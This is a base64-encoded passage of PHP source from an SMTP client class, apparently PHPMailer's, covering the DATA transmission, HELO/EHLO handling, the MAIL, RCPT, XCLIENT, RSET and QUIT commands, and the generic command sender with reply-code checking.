AgICAgICAgKiBXZSB3aWxsIGFsc28gbG9vayBmb3IgbGluZXMgdGhhdCBzdGFydCB3aXRoIGEgJy4nIGFuZCBwcmVwZW5kIGFuIGFkZGl0aW9uYWwgJy4nLgogICAgICAgICAqIE5PVEU6IHRoaXMgZG9lcyBub3QgY291bnQgdG93YXJkcyBsaW5lLWxlbmd0aCBsaW1pdC4KICAgICAgICAgKi8KCiAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBicmVha3MgYmVmb3JlIGV4cGxvZGluZwogICAgICAgICRsaW5lcyA9IGV4cGxvZGUoIlxuIiwgc3RyX3JlcGxhY2UoWyJcclxuIiwgIlxyIl0sICJcbiIsICRtc2dfZGF0YSkpOwoKICAgICAgICAvKiBUbyBkaXN0aW5ndWlzaCBiZXR3ZWVuIGEgY29tcGxldGUgUkZDODIyIG1lc3NhZ2UgYW5kIGEgcGxhaW4gbWVzc2FnZSBib2R5LCB3ZSBjaGVjayBpZiB0aGUgZmlyc3QgZmllbGQKICAgICAgICAgKiBvZiB0aGUgZmlyc3QgbGluZSAoJzonIHNlcGFyYXRlZCkgZG9lcyBub3QgY29udGFpbiBhIHNwYWNlIHRoZW4gaXQgX3Nob3VsZF8gYmUgYSBoZWFkZXIsIGFuZCB3ZSB3aWxsCiAgICAgICAgICogcHJvY2VzcyBhbGwgbGluZXMgYmVmb3JlIGEgYmxhbmsgbGluZSBhcyBoZWFkZXJzLgogICAgICAgICAqLwoKICAgICAgICAkZmllbGQgPSBzdWJzdHIoJGxpbmVzWzBdLCAwLCBzdHJwb3MoJGxpbmVzWzBdLCAnOicpKTsKICAgICAgICAkaW5faGVhZGVycyA9IGZhbHNlOwogICAgICAgIGlmICghZW1wdHkoJGZpZWxkKSAmJiBzdHJwb3MoJGZpZWxkLCAnICcpID09PSBmYWxzZSkgewogICAgICAgICAgICAkaW5faGVhZGVycyA9IHRydWU7CiAgICAgICAgfQoKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGxpbmUpIHsKICAgICAgICAgICAgJGxpbmVzX291dCA9IFtdOwogICAgICAgICAgICBpZiAoJGluX2hlYWRlcnMgJiYgJGxpbmUgPT09ICcnKSB7CiAgICAgICAgICAgICAgICAkaW5faGVhZGVycyA9IGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vQnJlYWsgdGhpcyBsaW5lIHVwIGludG8gc2V2ZXJhbCBzbWFsbGVyIGxpbmVzIGlmIGl0J3MgdG9vIGxvbmcKICAgICAgICAgICAgLy9NaWNyby1vcHRpbWlzYXRpb246IGlzc2V0KCRzdHJbJGxlbl0pIGlzIGZhc3RlciB0aGFuIChzdHJsZW4oJHN0cikgPiAkbGVuKSwKICAgICAgICAgICAgd2hpbGUgKGlzc2V0KCRsaW5lW3NlbGY6Ok1BWF9MSU5FX0xFTkdUSF0pKSB7CiAgICAgICAgICAgICAgICAvL1dvcmtpbmcgYmFja3dhcmRzLCB0cnkgdG8gZmluZCBhIHNwYWNlIHdpdGhpbiB0aGUgbGFzdCBNQVhfTElORV9MRU5HVEggY2hhcnMgb2YgdGhlIGxpbmUgdG8gYnJlYWsgb24KICAgICAgICAgICAgICAgIC8vc28gYXMgdG8gYXZvaWQgYnJlYWtpbmcgaW4gdGhlIG1pZGRsZSBvZiBhIHdvcmQKICAgICAgICAgICAgICAgICRwb3MgPSBzdHJycG9zKHN1YnN0cigkbGluZSwgMCwgc2VsZjo6TUFYX0xJTkVfTEVOR1RIKSwgJyAnKTsKICAgICAgICAgICAgICAgIC8vRGVsaWJlcmF0ZWx5IG1hdGNoZXMgYm90aCBmYWxzZSBhbmQgMAogICAgICAgICAgICAgICAgaWYgKCEkcG9zKSB7CiAgICAgICAgICAgICAgICAgICAgLy9ObyBuaWNlIGJyZWFrIGZvdW5kLCBhZGQgYSBoYXJkIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgJHBvcyA9IHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCAtIDE7CiAgICAgICAgICAgICAgICAgICAgJGxpbmVzX291dFtdID0gc3Vic3RyKCRsaW5lLCAwLCAkcG9zKTsKICAgICAgICAgICAgICAgICAgICAkbGluZSA9IHN1YnN0cigkbGluZSwgJHBvcyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIC8vQnJlYWsgYXQgdGhlIGZvdW5kIHBvaW50CiAgICAgICAgICAgICAgICAgICAgJGxpbmVzX291dFtdID0gc3Vic3RyKCRsaW5lLCAwLCAkcG9zKTsKICAgICAgICAgICAgICAgICAgICAvL01vdmUgYWxvbmcgYnkgdGhlIGFtb3VudCB3ZSBkZWFsdCB3aXRoCiAgICAgICAgICAgICAgICAgICAgJGxpbmUgPSBzdWJzdHIoJGxpbmUsICRwb3MgKyAxKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vSWYgcHJvY2Vzc2luZyBoZWFkZXJzIGFkZCBhIExXU1AtY2hhciB0byB0aGUgZnJvbnQgb2YgbmV3IGxpbmUgUkZDODIyIHNlY3Rpb24gMy4xLjEKICAgICAgICAgICAgICAgIGlmICgkaW5faGVhZGVycykgewogICAgICAgICAgICAgICAgICAgICRsaW5lID0gIlx0IiAuICRsaW5lOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRsaW5lc19vdXRbXSA9ICRsaW5lOwoKICAgICAgICAgICAgLy9TZW5kIHRoZSBsaW5lcyB0byB0aGUgc2VydmVyCiAgICAgICAgICAgIGZvcmVhY2ggKCRsaW5lc19vdXQgYXMgJGxpbmVfb3V0KSB7CiAgICAgICAgICAgICAgICAvL0RvdC1zdHVmZmluZyBhcyBwZXIgUkZDNTMyMSBzZWN0aW9uIDQuNS4yCiAgICAgICAgICAgICAgICAvL2h0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmM1MzIxI3NlY3Rpb24tNC41LjIKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxpbmVfb3V0KSAmJiAkbGluZV9vdXRbMF0gPT09ICcuJykgewogICAgICAgICAgICAgICAgICAgICRsaW5lX291dCA9ICcuJyAuICRsaW5lX291dDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5jbGllbnRfc2VuZCgkbGluZV9vdXQgLiBzdGF0aWM6OkxFLCAnREFUQScpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvL01lc3NhZ2UgZGF0YSBoYXMgYmVlbiBzZW50LCBjb21wbGV0ZSB0aGUgY29tbWFuZAogICAgICAgIC8vSW5jcmVhc2UgdGltZWxpbWl0IGZvciBlbmQgb2YgREFUQSBjb21tYW5kCiAgICAgICAgJHNhdmV0aW1lbGltaXQgPSAkdGhpcy0+VGltZWxpbWl0OwogICAgICAgICR0aGlzLT5UaW1lbGltaXQgKj0gMjsKICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPnNlbmRDb21tYW5kKCdEQVRBIEVORCcsICcuJywgMjUwKTsKICAgICAgICAkdGhpcy0+cmVjb3JkTGFzdFRyYW5zYWN0aW9uSUQoKTsKICAgICAgICAvL1Jlc3RvcmUgdGltZWxpbWl0CiAgICAgICAgJHRoaXMtPlRpbWVsaW1pdCA9ICRzYXZldGltZWxpbWl0OwoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgYW4gU01UUCBIRUxPIG9yIEVITE8gY29tbWFuZC4KICAgICAqIFVzZWQgdG8gaWRlbnRpZnkgdGhlIHNlbmRpbmcgc2VydmVyIHRvIHRoZSByZWNlaXZpbmcgc2VydmVyLgogICAgICogVGhpcyBtYWtlcyBzdXJlIHRoYXQgY2xpZW50IGFuZCBzZXJ2ZXIgYXJlIGluIGEga25vd24gc3RhdGUuCiAgICAgKiBJbXBsZW1lbnRzIFJGQyA4MjE6IEhFTE8gPFNQPiA8ZG9tYWluPiA8Q1JMRj4KICAgICAqIGFuZCBSRkMgMjgyMSBFSExPLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhvc3QgVGhlIGhvc3QgbmFtZSBvciBJUCB0byBjb25uZWN0IHRvCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoZWxsbygkaG9zdCA9ICcnKQogICAgewogICAgICAgIC8vVHJ5IGV4dGVuZGVkIGhlbGxvIGZpcnN0IChSRkMgMjgyMSkKICAgICAgICBpZiAoJHRoaXMtPnNlbmRIZWxsbygnRUhMTycsICRob3N0KSkgewogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CgogICAgICAgIC8vU29tZSBzZXJ2ZXJzIHNodXQgZG93biB0aGUgU01UUCBzZXJ2aWNlIGhlcmUgKFJGQyA1MzIxKQogICAgICAgIGlmIChzdWJzdHIoJHRoaXMtPmhlbG9fcnBseSwgMCwgMykgPT0gJzQyMScpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kSGVsbG8oJ0hFTE8nLCAkaG9zdCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIGFuIFNNVFAgSEVMTyBvciBFSExPIGNvbW1hbmQuCiAgICAgKiBMb3ctbGV2ZWwgaW1wbGVtZW50YXRpb24gdXNlZCBieSBoZWxsbygpLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlbGxvIFRoZSBIRUxPIHN0cmluZwogICAgICogQHBhcmFtIHN0cmluZyAkaG9zdCAgVGhlIGhvc3RuYW1lIHRvIHNheSB3ZSBhcmUKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqCiAgICAgKiBAc2VlIGhlbGxvKCkKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRIZWxsbygkaGVsbG8sICRob3N0KQogICAgewogICAgICAgICRub2Vycm9yID0gJHRoaXMtPnNlbmRDb21tYW5kKCRoZWxsbywgJGhlbGxvIC4gJyAnIC4gJGhvc3QsIDI1MCk7CiAgICAgICAgJHRoaXMtPmhlbG9fcnBseSA9ICR0aGlzLT5sYXN0X3JlcGx5OwogICAgICAgIGlmICgkbm9lcnJvcikgewogICAgICAgICAgICAkdGhpcy0+cGFyc2VIZWxsb0ZpZWxkcygkaGVsbG8pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5zZXJ2ZXJfY2FwcyA9IG51bGw7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG5vZXJyb3I7CiAgICB9CgogICAgLyoqCiAgICAgKiBQYXJzZSBhIHJlcGx5IHRvIEhFTE8vRUhMTyBjb21tYW5kIHRvIGRpc2NvdmVyIHNlcnZlciBleHRlbnNpb25zLgogICAgICogSW4gY2FzZSBvZiBIRUxPLCB0aGUgb25seSBwYXJhbWV0ZXIgdGhhdCBjYW4gYmUgZGlzY292ZXJlZCBpcyBhIHNlcnZlciBuYW1lLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgYEhFTE9gIG9yIGBFSExPYAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gcGFyc2VIZWxsb0ZpZWxkcygkdHlwZSkKICAgIHsKICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBbXTsKICAgICAgICAkbGluZXMgPSBleHBsb2RlKCJcbiIsICR0aGlzLT5oZWxvX3JwbHkpOwoKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJG4gPT4gJHMpIHsKICAgICAgICAgICAgLy9GaXJzdCA0IGNoYXJzIGNvbnRhaW4gcmVzcG9uc2UgY29kZSBmb2xsb3dlZCBieSAtIG9yIHNwYWNlCiAgICAgICAgICAgICRzID0gdHJpbShzdWJzdHIoJHMsIDQpKTsKICAgICAgICAgICAgaWYgKGVtcHR5KCRzKSkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpZWxkcyA9IGV4cGxvZGUoJyAnLCAkcyk7CiAgICAgICAgICAgIGlmICghZW1wdHkoJGZpZWxkcykpIHsKICAgICAgICAgICAgICAgIGlmICghJG4pIHsKICAgICAgICAgICAgICAgICAgICAkbmFtZSA9ICR0eXBlOwogICAgICAgICAgICAgICAgICAgICRmaWVsZHMgPSAkZmllbGRzWzBdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbmFtZSA9IGFycmF5X3NoaWZ0KCRmaWVsZHMpOwogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJG5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAnU0laRSc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gKCRmaWVsZHMgPyAkZmllbGRzWzBdIDogMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAnQVVUSCc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWlzX2FycmF5KCRmaWVsZHMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHNbJG5hbWVdID0gJGZpZWxkczsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgYW4gU01UUCBNQUlMIGNvbW1hbmQuCiAgICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluCiAgICAgKiAkZnJvbS4gUmV0dXJucyB0cnVlIGlmIHN1Y2Nlc3NmdWwgb3IgZmFsc2Ugb3RoZXJ3aXNlLiBJZiBUcnVlCiAgICAgKiB0aGUgbWFpbCB0cmFuc2FjdGlvbiBpcyBzdGFydGVkIGFuZCB0aGVuIG9uZSBvciBtb3JlIHJlY2lwaWVudAogICAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIGRhdGEgY29tbWFuZC4KICAgICAqIEltcGxlbWVudHMgUkZDIDgyMTogTUFJTCA8U1A+IEZST006PHJldmVyc2UtcGF0aD4gPENSTEY+IGFuZAogICAgICogdHdvIGV4dGVuc2lvbnMsIG5hbWVseSBYVkVSUCBhbmQgU01UUFVURjguCiAgICAgKgogICAgICogVGhlIHNlcnZlcidzIEVITE8gcmVzcG9uc2UgaXMgbm90IGNoZWNrZWQuIElmIHVzZSBvZiBlaXRoZXIKICAgICAqIGV4dGVuc2lvbnMgaXMgZW5hYmxlZCBldmVuIHRob3VnaCB0aGUgc2VydmVyIGRvZXMgbm90IHN1cHBvcnQKICAgICAqIHRoYXQsIG1haWwgc3VibWlzc2lvbiB3aWxsIGZhaWwuCiAgICAgKgogICAgICogWFZFUlAgaXMgZG9jdW1lbnRlZCBhdCBodHRwczovL3d3dy5wb3N0Zml4Lm9yZy9WRVJQX1JFQURNRS5odG1sCiAgICAgKiBhbmQgU01UUFVURjggaXMgc3BlY2lmaWVkIGluIFJGQyA2NTMxLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZyb20gU291cmNlIGFkZHJlc3Mgb2YgdGhpcyBtZXNzYWdlCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBtYWlsKCRmcm9tKQogICAgewogICAgICAgICR1c2VWZXJwID0gKCR0aGlzLT5kb192ZXJwID8gJyBYVkVSUCcgOiAnJyk7CiAgICAgICAgJHVzZVNtdHB1dGY4ID0gKCR0aGlzLT5kb19zbXRwdXRmOCA/ICcgU01UUFVURjgnIDogJycpOwoKICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKAogICAgICAgICAgICAnTUFJTCBGUk9NJywKICAgICAgICAgICAgJ01BSUwgRlJPTTo8JyAuICRmcm9tIC4gJz4nIC4gJHVzZVNtdHB1dGY4IC4gJHVzZVZlcnAsCiAgICAgICAgICAgIDI1MAogICAgICAgICk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIGFuIFNNVFAgUVVJVCBjb21tYW5kLgogICAgICogQ2xvc2VzIHRoZSBzb2NrZXQgaWYgdGhlcmUgaXMgbm8gZXJyb3Igb3IgdGhlICRjbG9zZV9vbl9lcnJvciBhcmd1bWVudCBpcyB0cnVlLgogICAgICogSW1wbGVtZW50cyBmcm9tIFJGQyA4MjE6IFFVSVQgPENSTEY+LgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRjbG9zZV9vbl9lcnJvciBTaG91bGQgdGhlIGNvbm5lY3Rpb24gY2xvc2UgaWYgYW4gZXJyb3Igb2NjdXJzPwogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcXVpdCgkY2xvc2Vfb25fZXJyb3IgPSB0cnVlKQogICAgewogICAgICAgICRub2Vycm9yID0gJHRoaXMtPnNlbmRDb21tYW5kKCdRVUlUJywgJ1FVSVQnLCAyMjEpOwogICAgICAgICRlcnIgPSAkdGhpcy0+ZXJyb3I7IC8vU2F2ZSBhbnkgZXJyb3IKICAgICAgICBpZiAoJG5vZXJyb3IgfHwgJGNsb3NlX29uX2Vycm9yKSB7CiAgICAgICAgICAgICR0aGlzLT5jbG9zZSgpOwogICAgICAgICAgICAkdGhpcy0+ZXJyb3IgPSAkZXJyOyAvL1Jlc3RvcmUgYW55IGVycm9yIGZyb20gdGhlIHF1aXQgY29tbWFuZAogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRub2Vycm9yOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBhbiBTTVRQIFJDUFQgY29tbWFuZC4KICAgICAqIFNldHMgdGhlIFRPIGFyZ3VtZW50IHRvICR0b2FkZHIuCiAgICAgKiBSZXR1cm5zIHRydWUgaWYgdGhlIHJlY2lwaWVudCB3YXMgYWNjZXB0ZWQgZmFsc2UgaWYgaXQgd2FzIHJlamVjdGVkLgogICAgICogSW1wbGVtZW50cyBmcm9tIFJGQyA4MjE6IFJDUFQgPFNQPiBUTzo8Zm9yd2FyZC1wYXRoPiA8Q1JMRj4uCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgYWRkcmVzcyB0aGUgbWVzc2FnZSBpcyBiZWluZyBzZW50IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkc24gICAgIENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIERTTiBub3RpZmljYXRpb25zLiBORVZFUiwgU1VDQ0VTUywgRkFJTFVSRQogICAgICogICAgICAgICAgICAgICAgICAgICAgICBvciBERUxBWS4gSWYgeW91IHNwZWNpZnkgTkVWRVIgYWxsIG90aGVyIG5vdGlmaWNhdGlvbnMgYXJlIGlnbm9yZWQuCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiByZWNpcGllbnQoJGFkZHJlc3MsICRkc24gPSAnJykKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJGRzbikpIHsKICAgICAgICAgICAgJHJjcHQgPSAnUkNQVCBUTzo8JyAuICRhZGRyZXNzIC4gJz4nOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRkc24gPSBzdHJ0b3VwcGVyKCRkc24pOwogICAgICAgICAgICAkbm90aWZ5ID0gW107CgogICAgICAgICAgICBpZiAoc3RycG9zKCRkc24sICdORVZFUicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgJG5vdGlmeVtdID0gJ05FVkVSJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKFsnU1VDQ0VTUycsICdGQUlMVVJFJywgJ0RFTEFZJ10gYXMgJHZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkZHNuLCAkdmFsdWUpICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkbm90aWZ5W10gPSAkdmFsdWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkcmNwdCA9ICdSQ1BUIFRPOjwnIC4gJGFkZHJlc3MgLiAnPiBOT1RJRlk9JyAuIGltcGxvZGUoJywnLCAkbm90aWZ5KTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoCiAgICAgICAgICAgICdSQ1BUIFRPJywKICAgICAgICAgICAgJHJjcHQsCiAgICAgICAgICAgIFsyNTAsIDI1MV0KICAgICAgICApOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBTTVRQIFhDTElFTlQgY29tbWFuZCB0byBzZXJ2ZXIgYW5kIGNoZWNrIGl0cyByZXR1cm4gY29kZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBvbiBzdWNjZXNzCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB4Y2xpZW50KGFycmF5ICR2YXJzKQogICAgewogICAgICAgICR4Y2xpZW50X29wdGlvbnMgPSAiIjsKICAgICAgICBmb3JlYWNoICgkdmFycyBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAgICAgICBpZiAoaW5fYXJyYXkoJGtleSwgU01UUDo6JHhjbGllbnRfYWxsb3dlZF9hdHRyaWJ1dGVzKSkgewogICAgICAgICAgICAgICAgJHhjbGllbnRfb3B0aW9ucyAuPSAiIHska2V5fT17JHZhbHVlfSI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCEkeGNsaWVudF9vcHRpb25zKSB7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdYQ0xJRU5UJywgJ1hDTElFTlQnIC4gJHhjbGllbnRfb3B0aW9ucywgMjUwKTsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgYW4gU01UUCBSU0VUIGNvbW1hbmQuCiAgICAgKiBBYm9ydCBhbnkgdHJhbnNhY3Rpb24gdGhhdCBpcyBjdXJyZW50bHkgaW4gcHJvZ3Jlc3MuCiAgICAgKiBJbXBsZW1lbnRzIFJGQyA4MjE6IFJTRVQgPENSTEY+LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIG9uIHN1Y2Nlc3MKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHJlc2V0KCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdSU0VUJywgJ1JTRVQnLCAyNTApOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBhIGNvbW1hbmQgdG8gYW4gU01UUCBzZXJ2ZXIgYW5kIGNoZWNrIGl0cyByZXR1cm4gY29kZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICRjb21tYW5kICAgICAgIFRoZSBjb21tYW5kIG5hbWUgLSBub3Qgc2VudCB0byB0aGUgc2VydmVyCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICRjb21tYW5kc3RyaW5nIFRoZSBhY3R1YWwgY29tbWFuZCB0byBzZW5kCiAgICAgKiBAcGFyYW0gaW50fGFycmF5ICRleHBlY3QgICAgICAgIE9uZSBvciBtb3JlIGV4cGVjdGVkIGludGVnZXIgc3VjY2VzcyBjb2RlcwogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIG9uIHN1Y2Nlc3MKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRDb21tYW5kKCRjb21tYW5kLCAkY29tbWFuZHN0cmluZywgJGV4cGVjdCkKICAgIHsKICAgICAgICBpZiAoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIkNhbGxlZCAkY29tbWFuZCB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAvL1JlamVjdCBsaW5lIGJyZWFrcyBpbiBhbGwgY29tbWFuZHMKICAgICAgICBpZiAoKHN0cnBvcygkY29tbWFuZHN0cmluZywgIlxuIikgIT09IGZhbHNlKSB8fCAoc3RycG9zKCRjb21tYW5kc3RyaW5nLCAiXHIiKSAhPT0gZmFsc2UpKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiQ29tbWFuZCAnJGNvbW1hbmQnIGNvbnRhaW5lZCBsaW5lIGJyZWFrcyIpOwoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+Y2xpZW50X3NlbmQoJGNvbW1hbmRzdHJpbmcgLiBzdGF0aWM6OkxFLCAkY29tbWFuZCk7CgogICAgICAgICR0aGlzLT5sYXN0X3JlcGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgICAgIC8vRmV0Y2ggU01UUCBjb2RlIGFuZCBwb3NzaWJsZSBlcnJvciBjb2RlIGV4cGxhbmF0aW9uCiAgICAgICAgJG1hdGNoZXMgPSBbXTsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnL14oW1xkXXszfSlbIC1dKD86KFtcZF1cXC5bXGRdXFwuW1xkXXsxLDJ9KSApPy8nLCAkdGhpcy0+bGFzdF9yZXBseSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICRjb2RlID0gKGludCkgJG1hdGNoZXNbMV07CiAgICAgICAgICAgICRjb2RlX2V4ID0gKGNvdW50KCRtYXRjaGVzKSA+IDIgPyAkbWF0Y2hlc1syXSA6IG51bGwpOwogICAgICAgICAgICAvL0N1dCBvZmYgZXJyb3IgY29kZSBmcm9tIGVhY2ggcmVzcG9uc2UgbGluZQogICAgICAgICAgICAkZGV0YWlsID0gcHJlZ19yZXBsYWNlKAogICAgICAgICAgICAgICAgIi97JGNvZGV9WyAtXSIgLgogICAgICAgICAgICAgICAgKCRjb2RlX2V4ID8gc3RyX3JlcGxhY2UoJy4nLCAnXFwuJywgJGNvZGVfZXgpIC4gJyAnIDogJycpIC4gJy9tJywKICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgJHRoaXMtPmxhc3RfcmVwbHkKICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL0ZhbGwgYmFjayB0byBzaW1wbGUgcGFyc2luZyBpZiByZWdleCBmYWlscwogICAgICAgICAgICAkY29kZSA9IChpbnQpIHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgMCwgMyk7CiAgICAgICAgICAgICRjb2RlX2V4ID0gbnVsbDsKICAgICAgICAgICAgJGRldGFpbCA9IHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgNCk7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTRVJWRVIgLT4gQ0xJRU5UOiAnIC4gJHRoaXMtPmxhc3RfcmVwbHksIHNlbGY6OkRFQlVHX1NFUlZFUik7CgogICAgICAgIGlmICghaW5fYXJyYXkoJGNvZGUsIChhcnJheSkgJGV4cGVjdCwgdHJ1ZSkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKAogICAgICAgICAgICAgICAgIiRjb21tYW5kIGNvbW1hbmQgZmFpbGVkIiwKICAgICAgICAgICAgICAgICRkZXRhaWwsCiAgICAgICAgICAgICAgICAkY29kZSwKICAgICAgICAgICAgICAgICRjb2RlX2V4CiAgICAgICAgICAgICk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAgICAgICAnU01UUCBFUlJPUjogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSAuICc6ICcgLiAkdGhpcy0+bGFzdF9yZXBseSwKICAgICAgICAgICAgICAgIHNlbGY6OkRFQlVHX0NMSUVOVAogICAgICAgICAgICApOwoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgLy9Eb24ndCBjbGVhciB0aGUgZXJyb3Igc3RvcmUgd2hlbiB1c2luZyBrZWVwYWxpdmUKICAgICAgICBpZiAoJGNvbW1hbmQgIT09ICdSU0VUJykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJycpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIGFuIFNNVFAgU0FNTCBjb21tYW5kLgogICAgICogU3RhcnRzIGEgbWFpbCB0cmFuc2FjdGlvbiBmcm9tIHRoZSBlbWFpbCBhZGRyZXNzIHNwZWNpZmllZCBpbiAkZnJvbS4KICAgICAqIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAgICogdGhlIG1haWwgdHJhbnNhY3Rpb24gaXMgc3RhcnRlZCBhbmQgdGhl